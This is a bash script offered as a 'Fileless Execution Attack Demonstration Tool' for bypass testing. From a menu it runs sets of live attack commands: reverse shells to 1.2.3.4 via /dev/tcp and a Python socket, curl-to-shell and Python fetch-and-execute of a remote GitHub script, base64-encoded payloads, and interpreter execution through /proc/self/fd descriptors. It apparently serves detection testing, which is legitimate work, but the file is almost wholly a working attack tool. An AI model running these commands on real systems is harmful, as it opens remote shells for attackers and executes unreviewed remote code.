#!/bin/bash

# === Requirements ===
if ! command -v figlet >/dev/null; then
  echo "Installing figlet..."
  apt-get install -y figlet &>/dev/null || yum install -y figlet &>/dev/null
fi

# === Title ===
echo -e "\e[1;31m"
figlet FILELESS
echo -e "\e[0m\e[1;32m      Fileless Execution Attack Demonstration Tool (Bypass Test)\e[0m"
echo

# === Categories ===
reverse_shells=(
"timeout 5 bash -c 'exec 5<>/dev/tcp/1.2.3.4/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'"
"timeout 5 bash -c 'exec \${FD:-5}<>/dev/tcp/1.2.3.4/5555; while read -r line <&\${FD}; do bash -c \"\$line\" 2>&\${FD} >&\${FD}; done'"
"timeout 5 bash -c 'bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'"
"timeout 5 python3 -c \"import socket,os;s=socket.socket();s.connect(('1.2.3.4',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execvp('bash',['bash'])\""
)

curl_based=(
"curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh | sh"
"bash -c \"eval \$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh)\""
"bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh)\""
"exec 10< <(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh); bash /proc/self/fd/10"
)

python_based=(
"exec 3< <(python3 -c \"import urllib.request;print(urllib.request.urlopen('https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh').read().decode())\"); bash /proc/self/fd/3"
"exec 4< <(python3 -c \"import os; os.system('curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh | bash')\"); bash /proc/self/fd/4"
"exec 5< <(python3 -c \"import subprocess; subprocess.run('curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh | bash', shell=True)\"); bash /proc/self/fd/5"
"exec 20< <(python3 -c \"exec(__import__('urllib.request').urlopen('https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh').read().decode())\"); bash /proc/self/fd/20"
)

encoded=(
"exec 6< <(python3 -c \"import base64;exec(base64.b64decode('ZWNobyAnRkQgdGVzdCcK'))\"); bash /proc/self/fd/6"
"exec 7< <(echo 'ZWNobyAnaGFja2VkIGZpbGVsZXNzJwo=' | base64 -d); bash /proc/self/fd/7"
"exec 8< <(bash -c 'echo pwned'); bash /proc/self/fd/8"
"exec 9< <(sh -i); /proc/self/fd/9"
)

fd_interpreter_execs=(
"exec 30< /bin/sh; /proc/self/fd/30 -c 'echo executed via FD sh'"
"exec 31< /usr/bin/python3; /proc/self/fd/31 -c \"print('executed via FD python')\""
"exec 32< /bin/bash; /proc/self/fd/32 -c 'echo bash via FD worked'"
"exec 33< /usr/bin/python3; exec 34< <(echo 'print(1337)'); /proc/self/fd/33 /proc/self/fd/34"
"exec 35< /bin/sh; exec 36< <(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh); /proc/self/fd/35 /proc/self/fd/36"
)

# === Menu ===
echo -e "\e[1;34mChoose attack category:\e[0m"
echo "1) Reverse Shell (/dev/tcp)"
echo "2) Curl-Based Execution"
echo "3) Python-Based Execution"
echo "4) Encoded Payloads"
echo "5) Run ALL Attacks"
echo "6) Interpreter via FD (sh/python/bash)"
read -p $'\nSelect option [1-6]: ' choice

# === Execution Function ===
run_attacks() {
  local -n arr=$1
  for cmd in "${arr[@]}"; do
    echo -e "\n\e[1;33m[EXEC]\e[0m $cmd"
    bash -c "$cmd"
  done
}

# === Run Selected Category ===
echo
case $choice in
  1) run_attacks reverse_shells ;;
  2) run_attacks curl_based ;;
  3) run_attacks python_based ;;
  4) run_attacks encoded ;;
  5)
    run_attacks reverse_shells
    run_attacks curl_based
    run_attacks python_based
    run_attacks encoded
    run_attacks fd_interpreter_execs
    ;;
  6) run_attacks fd_interpreter_execs ;;
  *) echo -e "\e[1;31mInvalid option. Exiting.\e[0m" ;;
esac
